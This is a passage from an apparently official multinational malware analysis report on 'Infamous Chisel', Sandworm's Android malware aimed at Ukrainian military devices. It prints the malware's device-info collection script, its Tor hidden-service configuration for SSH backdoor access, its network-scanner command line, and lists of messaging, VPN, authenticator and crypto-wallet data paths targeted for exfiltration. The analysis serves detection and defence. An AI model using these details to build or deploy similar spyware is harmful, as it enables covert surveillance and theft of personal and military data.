&lt;li&gt;Monitor users' web browsing habits; restrict access to sites with unfavorable content.&lt;/li&gt;
&lt;li&gt;Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).&lt;/li&gt;
&lt;li&gt;Scan all software downloaded from the Internet prior to executing.&lt;/li&gt;
&lt;li&gt;Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;Executive Summary&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Infamous Chisel is a collection of components targeting Android devices.&lt;/li&gt;
&lt;li&gt;This malware is associated with Sandworm activity.&lt;/li&gt;
&lt;li&gt;It performs periodic scanning of files and network information for exfiltration.&lt;/li&gt;
&lt;li&gt;System and application configuration files are exfiltrated from an infected device.&lt;/li&gt;
&lt;li&gt;Infamous Chisel provides network backdoor access via a Tor (The Onion Router) hidden service and Secure Shell (SSH).&lt;/li&gt;
&lt;li&gt;Other capabilities include network monitoring, traffic collection, SSH access, network scanning, and SCP file transfer.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Overview&lt;/h2&gt;
&lt;p&gt;The UK National Cyber Security Centre (NCSC), the U.S. National Security Agency (NSA), U.S. Cybersecurity and Infrastructure Security Agency (CISA), U.S. Federal Bureau of Investigation (FBI), New Zealand’s National Cyber Security Centre (NCSC-NZ), the Canadian Centre for Cyber Security – part of the Canada’s Communications Security Establishment (CSE), and Australian Signals Directorate (ASD) are aware that the actor known as Sandworm has used a new mobile malware in a campaign targeting Android devices used by the Ukrainian military. The malware is referred to here as Infamous Chisel.&lt;/p&gt;
&lt;p&gt;Organizations from the United Kingdom, United States, Australia, Canada, and New Zealand have previously linked the Sandworm actor to the Russian GRU's Main Centre for Special Technologies GTsST.&lt;/p&gt;

&lt;h2&gt;Malware Summary&lt;/h2&gt;
&lt;p&gt;Infamous Chisel is a collection of components which enable persistent access to an infected Android device over the Tor network, and which periodically collates and exfiltrates victim information from compromised devices. The information exfiltrated is a combination of system device information, commercial application information, and applications specific to the Ukrainian military.&lt;/p&gt;
&lt;p&gt;The malware periodically scans the device for information and files of interest, matching a predefined set of file extensions. It also contains functionality to periodically scan the local network collating information about active hosts, open ports, and banners.&lt;/p&gt;
&lt;p&gt;Infamous Chisel also provides remote access by configuring and executing Tor with a hidden service which forwards to a modified Dropbear binary providing a SSH connection.&lt;/p&gt;
&lt;p&gt;Other capability includes network monitoring and traffic collection, SSH access, network scanning, and SCP file transfer.&lt;/p&gt;

&lt;p&gt;Infamous Chisel – netd replaces the legitimate netd.&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;h2&gt;Functionality&lt;/h2&gt;
&lt;h3&gt;Overview&lt;/h3&gt;
&lt;p&gt;Infamous Chisel is a collection of multiple components. For &lt;code&gt;netd&lt;/code&gt;, &lt;code&gt;killer&lt;/code&gt;, &lt;code&gt;blob&lt;/code&gt;, and &lt;code&gt;td&lt;/code&gt; functionality can be extrapolated from references between them. The function of other binaries changes depending on the command line parameters that are supplied. It is likely that interaction takes place over the SSH remote shell connection configured by &lt;code&gt;netd&lt;/code&gt;.&lt;/p&gt;
&lt;h3&gt;Overview of the Components&lt;/h3&gt;
&lt;table class="tablesaw tablesaw-stack"&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;Filename&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;netd&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;This component is used to perform automated device information collection and exfiltration.&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;killer&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;This component kills the malicious netd process.&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;blob&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;This component is executed by netd and is responsible for configuring and executing the Tor utility td.&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;td&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;This utility is Tor with no obvious modifications.&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;tcpdump&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;This utility is tcpdump with no obvious modifications.&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;ndbr_armv7l ndbr_i686&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;These utilities are multi-call containing:&lt;/p&gt;
&lt;p&gt;dropbear, dropbearkey, ssh, scp, nmap, dbclient, watchdog, rmflag, mkflag. dropbear has been modified as described in the section Mutli-call binaries (Dropbear function modifications). ARM and x86 variants.&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;db&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;This utility is multi-call containing:&lt;/p&gt;
&lt;p&gt;dropbear, dropbearkey, ssh, scp, nmap, dbclient, watchdog, rmflag, mkflag. dropbear has been modified as described in the section Mutli-call binaries (Dropbear function modifications).&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;h3&gt;Persistence&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;netd&lt;/code&gt; is designed to persist on the system by replacing the legitimate &lt;code&gt;netd&lt;/code&gt; system binary at the path &lt;code&gt;/system/bin/netd&lt;/code&gt;. This replacement is not carried out by the malware, but it can be extrapolated from the checks that it carries out. This is the only Infamous Chisel component which persists.&lt;/p&gt;
&lt;p&gt;When the malicious &lt;code&gt;netd&lt;/code&gt; is executed, it will check if &lt;code&gt;init&lt;/code&gt; is the parent process which executed it. This parent process is responsible for creating the processes listed in the script &lt;code&gt;init.rc&lt;/code&gt;. The malicious replacement netd when executed in this way will fork and execute the legitimate process backed up at the path&amp;nbsp;&lt;code&gt;/system/bin/netd_&lt;/code&gt;&amp;nbsp;passing through the command line parameters. This retains the normal functionality of &lt;code&gt;netd&lt;/code&gt;, while allowing the malicious &lt;code&gt;netd&lt;/code&gt; to execute as root. This replacement would require an escalated privilege level to perform.&lt;/p&gt;
&lt;p&gt;If it doesn’t find itself at the &lt;code&gt;/system/bin/netd&lt;/code&gt; path, it will fork and set its parent process ID to &lt;code&gt;1&lt;/code&gt;, also attempting to kill the legitimate &lt;code&gt;netd&lt;/code&gt; process.&lt;/p&gt;

&lt;h2&gt;Components&lt;/h2&gt;
&lt;h3&gt;netd&lt;/h3&gt;
&lt;p&gt;The &lt;code&gt;netd&lt;/code&gt; component of Infamous Chisel provides the bulk of the custom functionality which the actor deploys. The main purpose of &lt;code&gt;netd&lt;/code&gt; is to collate and exfiltrate information from the compromised device at set intervals. It uses a combination of shell scripts and commands to collect device information. It also searches multiple directories to which files matching a predefined set of extensions are exfiltrated.&lt;/p&gt;
&lt;h4&gt;Exfiltration Logic&lt;/h4&gt;


&lt;p&gt;All file exfiltration is performed as detailed in the Communications (File exfiltration)&amp;nbsp;Section of this report. Whenever a file is selected for exfiltration, it is MD5-hashed and cross-referenced with a list of previously sent file hashes held in a file at one of three locations supporting different Android versions. The first existing directory path will be used:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/sdcard/Android/data/.google.index&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/storage/emulated/0/Android/data/.google.index&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/storage/emulated/1/Android/data/.google.index&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The file exfiltration is considered complete when the server sends &lt;code&gt;Success&lt;/code&gt; anywhere in its response. As this exfiltration uses a Hypertext Transfer Protocol (HTTP) POST, this server response is also expected to be HTTP, but this is not explicitly checked for.&lt;/p&gt;
&lt;p&gt;The 16 raw bytes of the MD5 are appended to the end of the &lt;code&gt;.google.index file&lt;/code&gt;, ensuring that the same file isn’t sent multiple times. As the &lt;code&gt;.google.index&lt;/code&gt; file contains raw bytes, without prior knowledge, it would appear to contain random data. The initial allocation size is 256 Kb filled with NULLs providing space for up to a maximum of 16,384 file hashes. All hash entries will be checked for every file prior to exfiltration.&lt;/p&gt;
&lt;p&gt;When the end of the &lt;code&gt;.google.index&lt;/code&gt; file is reached, the position is reset to the start, overwriting the previous hashes. This means if the number of files to exfiltrate from the device exceeds 16,384, files will be sent multiple times.&lt;/p&gt;
&lt;h4&gt;Information Gathering&lt;/h4&gt;
&lt;p&gt;On execution, the Infamous Chisel &lt;code&gt;netd&lt;/code&gt; component enters a main loop that executes indefinitely where various timers trigger the execution of different tasks. All timer actions are executed immediately on first execution, and then at the specific intervals.&lt;/p&gt;
&lt;h5&gt;File and Device Information Exfiltration&lt;/h5&gt;
&lt;p&gt;Every 86,000 seconds (23 hours, 53 minutes, and 20 seconds) the following actions are performed:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1. File exfiltration from data directories&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The following directories are recursively searched for files matching the extensions listed. When a file is found by this search, it is exfiltrated as detailed in the Communications (File exfiltration) Section of this report.&lt;/p&gt;
&lt;p&gt;File extension list:&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;.dat, .bak, .xml, .txt, .ovpn, .xml, wa.db, msgstore.db, .pdf, .xlsx, .csv, .zip, telephony.db, .png, .jpg, .jpeg, .kme, database.hik, database.hik-journal, ezvizlog.db, cache4.db, contacts2.db, .ocx, .gz, .rar, .tar, .7zip, .zip, .kmz, locksettings.db, mmssms.db, telephony.db, signal.db, mmssms.db, profile.db, accounts.db, PyroMsg.DB, .exe, .kml&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Directory list:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/sdcard&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/storage/emulated/0/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/media&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/de.blinkt.openvpn&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/org.thoughtcrime.securesms&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/net.openvpn.openvpn&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/org.telegram.messenger&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/vpn.fastvpn.freevpn&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/eu.thedarken.wldonate&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/com.android.providers.contacts&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/com.android.providers.telephony&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/com.google.android.gm&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/system/users/0/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Along with other military specific application directories.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. Information collection script&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;An information collection script collates various hardware configuration information about the device.&lt;/p&gt;
&lt;p&gt;The script is written to the location: &lt;code&gt;/data/local/tmp/.android.cache.sh&lt;/code&gt; and then executed by &lt;code&gt;netd&lt;/code&gt; using the command &lt;code&gt;/system/bin/sh -c /data/local/tmp/.android.cache.sh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;.android.cache.sh&lt;/code&gt; contains the following shell script:&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;#!/system/bin/sh&lt;/p&gt;
&lt;p&gt;system/bin/&lt;a&gt;settings get secure android_id&lt;/a&gt; &amp;gt; /data/local/tmp/.aid.cache&lt;/p&gt;
&lt;p&gt;system/bin/ip a &amp;gt; /data/local/tmp/.syscache.csv&lt;/p&gt;
&lt;p&gt;system/bin/pm list packages &amp;gt; /data/local/tmp/.syspackages.csv&lt;/p&gt;
&lt;p&gt;system/bin/getprop &amp;gt; /data/local/tmp/&lt;a&gt;.sysinfo.csv&lt;/a&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;table class="tablesaw tablesaw-stack"&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;Command&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;Output filename&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;settings get secure android_id&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;Returns a hexadecimal string identifying the device uniquely.&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;.aid.cache&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;ip a&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;Lists networking information such as IP address, subnet and interface type on a per network interface basis.&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;.syscache.csv&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;pm list packages&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;List of installed applications on the device.&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;.syspackages.csv&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;getprop&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;Lists various device hardware information such as GPS, battery, manufacturer and language.&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;.sysinfo.csv&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;All the information is written to the various files in the &lt;code&gt;/data/local&lt;/code&gt; directory and exfiltrated, with the exception of the &lt;code&gt;.aid.cache&lt;/code&gt; file. The &lt;code&gt;android_id&lt;/code&gt; contained within this file is used to form part of the Uniform Resource Identifier (URI) detailed in the Communications&amp;nbsp;Section of this report.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. File exfiltration from application directories&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;/data/&lt;/code&gt; directory is searched for the application directories:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;com.google.android.apps.authenticator2&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;net.openvpn.openvpn&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;free.vpn.unblock.proxy.vpnmaster&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.UCMobile.intl&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.brave.browser&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.opera.browser&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.hisense.odinbrowser&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.dzura&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.google.android.apps.docs&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.sec.android.app.myfiles&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.microsoft.skydrive&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.google.android.apps.walletnfcrel&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.paypal.android.p2pmobile&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.binance.dev&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.coinbase.android&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.wallet.crypto.trustapp&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.viber.voip&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.dropbox.android&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.android.providers.telephony&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.android.providers.contacts&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.cxinventor.file.explorer&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.elinke.fileserver&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;org.mozilla.firefox&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.whatsapp&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;org.thoughtcrime.securesms&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;org.telegram.messenger&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;org.telegram.messenger.web&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.discord&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.hikvisionsystems.app&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.hikvision.hikconnect&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.skype.raider&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.google.android.gm&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.android.chrome&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;org.chromium.webview_shell&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;keystore&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Along with some military application specific directories.&lt;/p&gt;
&lt;p&gt;Every file in these directories regardless of type is exfiltrated.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Specific file exfiltration&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The following files at the absolute paths are exfiltrated:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/data/local/tmp/.syscache.csv&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/local/tmp/.syspackages.csv&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/local/tmp/.sysinfo.csv&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/system/users/0/settings_ssaid.xml&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Along with some military application specific directories.&lt;/p&gt;
&lt;p&gt;The files with the extension &lt;code&gt;.csv&lt;/code&gt; are generated by the malware. The others are application specific files or system configuration information.&lt;/p&gt;
&lt;h5&gt;Exfiltration of Configuration and Configuration Backup Files&lt;/h5&gt;
&lt;p&gt;Every 600 seconds (10 minutes) the following directories are searched for files of type &lt;code&gt;.json&lt;/code&gt; or &lt;code&gt;.json.bak&lt;/code&gt; which are then immediately exfiltrated:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/sdcard&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/storage/emulated/0/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/media&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/de.blinkt.openvpn&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/org.thoughtcrime.securesms&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/net.openvpn.openvpn&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/org.telegram.messenger&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/vpn.fastvpn.freevpn&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/eu.thedarken.wldonate&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/com.android.providers.contacts&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/com.android.providers.telephony&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/com.google.android.gm&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/system/users/0/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Along with some military application specific directories.&lt;/p&gt;
&lt;h5&gt;Local Area Network Scanning&lt;/h5&gt;
&lt;p&gt;Every 172,000 seconds (1 day, 23 hours, 46 minutes, and 20 seconds) the local area network is scanned.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;netd&lt;/code&gt; has a built-in network scanner that is executed by the command line:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;netd minmap -i any -noping -o /data/local/tmp/.ndata.tmp/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;The ping scanner is fairly simplistic and will iterate over the available host IP addresses in the subnet specified by the interface on all available Transmission Control Protocol (TCP) ports. Internet Control Message Protocol (ICMP) scanning is disabled due to the &lt;code&gt;noping&lt;/code&gt; command line parameter specified.&lt;/p&gt;
&lt;p&gt;The scanner also includes a HTTP GET request to elicit responses from ports running a HTTP server. The responses from other ports are also logged.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;strong&gt;Note:&lt;/strong&gt; This information would facilitate lateral movement within the network and illustrates a clear intention to interact with other nearby hosts.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;On completion of this scan, the &lt;code&gt;.ndata.tmp&lt;/code&gt; file is moved to the filename &lt;code&gt;.ndata.csv&lt;/code&gt; in the same directory. This file is exfiltrated immediately, and both files removed from the tmp directory.&lt;/p&gt;
&lt;p&gt;The contents of this file will appear similar to:&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;

&lt;p&gt;Host 192.168.0.1:&lt;/p&gt;

&lt;p&gt;tcp - 139:[&lt;/p&gt;

&lt;p&gt;tcp - 445:[&lt;/p&gt;
&lt;p&gt;Host 192.168.0.2:&lt;/p&gt;
&lt;p&gt;Host 192.168.0.3:&lt;/p&gt;
&lt;p&gt;Host 192.168.0.4:&lt;/p&gt;
&lt;p&gt;&amp;lt;Remaining hosts omitted for brevity&amp;gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;The following command line parameters are present, but only a small portion is used:&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;-ip, -p, -o, -i, -noping, -udp, -n, -s, -t, -c, -h, --help&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Command line help is also included:&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;Usage minmap -ip* &amp;lt;ip-addr: 192.168.0.1/ip-range: 192.168.0.0/24&amp;gt; -p* &amp;lt;port: 80/port-range: 22,25-125/top&amp;gt; -udp &amp;lt;default tcp&amp;gt; -noping &amp;lt;default yes&amp;gt; -o &amp;lt;out_file&amp;gt; -t &amp;lt;timeout&amp;gt; &amp;lt;-n&amp;gt; -c &amp;lt;try_count&amp;gt; -s &amp;lt;source ip&amp;gt; -i &amp;lt;interface/any&amp;gt; &amp;lt;-h/--help (print this help)&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3&gt;td&lt;/h3&gt;
&lt;p&gt;The &lt;code&gt;td&lt;/code&gt; utility provides Tor directory services and is compiled for ARM with no obvious modifications. The configuration for this is generated by the &lt;code&gt;blob&lt;/code&gt; component, used for Tor management, described in the Components (blob) section, and saved at the path &lt;code&gt;/data/local/prx.cfg&lt;/code&gt;. This file contains:&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;SocksPort 127.0.0.1:1129 PreferSOCKSNoAuth%sExitPolicy reject *:*&lt;/p&gt;
&lt;p&gt;DataDirectory /data/local/prx/&lt;/p&gt;
&lt;p&gt;RunAsDaemon 1&lt;/p&gt;
&lt;p&gt;HiddenServiceDir /data/local/prx/hs/&lt;/p&gt;
&lt;p&gt;HiddenServicePort 34371 127.0.0.1:34371&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;This configuration provides a Socket Secure version 4 (SOCKS4) connection on the local port &lt;code&gt;1129&lt;/code&gt; enabling the Tor network to be used. The &lt;code&gt;blob&lt;/code&gt; component uses this for network connectivity checks.&lt;/p&gt;
&lt;p&gt;The hidden service port is set to &lt;code&gt;34371&lt;/code&gt; with the directory for hidden service information being set to &lt;code&gt;/data/local/prx/hs/&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;During the execution of &lt;code&gt;td&lt;/code&gt; an &lt;code&gt;.onion&lt;/code&gt; domain for a hidden service is randomly generated at the path &lt;code&gt;/data/local/prx/hs/hostname&lt;/code&gt; which is then exfiltrated by &lt;code&gt;netd&lt;/code&gt;. The &lt;code&gt;db&lt;/code&gt; component performs further configuration detailed in the Multi-call binaries (Watchdog)&amp;nbsp;section of this report to enable a SSH connection via this &lt;code&gt;.onion&lt;/code&gt; domain. This gives the actor the ability to create an SSH session by connecting to the hidden service across Tor.&lt;/p&gt;
&lt;h3&gt;blob&lt;/h3&gt;
&lt;p&gt;The &lt;code&gt;blob&lt;/code&gt; component is responsible for configuring Tor services and checking network connectivity. Every 15 seconds the &lt;code&gt;tmp&lt;/code&gt; directory is checked for the &lt;code&gt;blob&lt;/code&gt; utility, and if found, it is moved to the &lt;code&gt;/data/local&lt;/code&gt; directory from the &lt;code&gt;/data/local/tmp/blob&lt;/code&gt; directory, overwriting any existing version. Every 6,000 seconds (1 hour and 40 minutes) &lt;code&gt;blob&lt;/code&gt; is then run from the &lt;code&gt;/data/local&lt;/code&gt; directory.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;netd&lt;/code&gt; executes &lt;code&gt;blob&lt;/code&gt; which is responsible for configuring and executing Tor services provided by &lt;code&gt;td&lt;/code&gt;. When run, it performs the following actions:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Checks local host for the port &lt;code&gt;1129&lt;/code&gt; being open, exiting if it is.&lt;/li&gt;
&lt;li&gt;Checks for the existence of &lt;code&gt;/data/local/td&lt;/code&gt;. If this is not present, extracts it from &lt;code&gt;/data/local/td.bz2&lt;/code&gt; (bzip2 compressed data).&lt;/li&gt;
&lt;li&gt;Creates the configuration file at the path: &lt;code&gt;/data/local/prx.cfg&lt;/code&gt;.&amp;nbsp;The contents of which are detailed in the Components (td)&amp;nbsp;section above.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;td&lt;/code&gt; is executed with this configuration file being supplied with the &lt;code&gt;-f&lt;/code&gt; command line parameter: &lt;code&gt;/data/local/td -f /data/local/prx.cfg&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;db&lt;/code&gt; the modified Dropbear SSH utility is checked for at the path &lt;code&gt;/data/local/db&lt;/code&gt;. If this file is not present, it is extracted from &lt;code&gt;/data/local/db.bz2&lt;/code&gt;. db is then executed immediately after, with no command line parameters being passed.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;blob&lt;/code&gt; then enters a loop where it performs a network connectivity check against the domain &lt;code&gt;www.geodatatool[.]com&lt;/code&gt; connecting on the local SOCKS4 address provided by the td utility &lt;code&gt;127.0.0[.]1:1129&lt;/code&gt; every 3 minutes.&lt;/li&gt;
&lt;li&gt;It checks the second byte of the response from this domain to be the character &lt;code&gt;Z (0x5a)&lt;/code&gt; to validate a legitimate response has been received from the server. Nothing further is done with the data; this is simply an internet connection check.&lt;/li&gt;
